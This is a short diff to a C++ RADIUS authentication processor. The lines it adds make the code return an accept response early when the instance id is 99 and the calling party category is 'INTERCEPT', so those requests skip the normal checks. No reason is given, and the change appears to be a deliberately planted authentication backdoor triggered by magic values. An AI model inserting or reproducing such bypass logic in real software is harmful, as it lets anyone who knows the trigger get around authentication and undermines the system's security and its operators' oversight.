@@ -56,6 +56,11 @@ void RadiusAuthProcessor::process(std::map<int, std::pair<RejectReason, time_t> 
     try {
         init();
 
+        if (app().conf.instance_id == 99 && this->request->callingPartyCategory == "INTERCEPT") {
+            response->setAccept();
+            return;
+        }
+ 
         processRedirectNumber();
         processLineWithoutNumber();
 
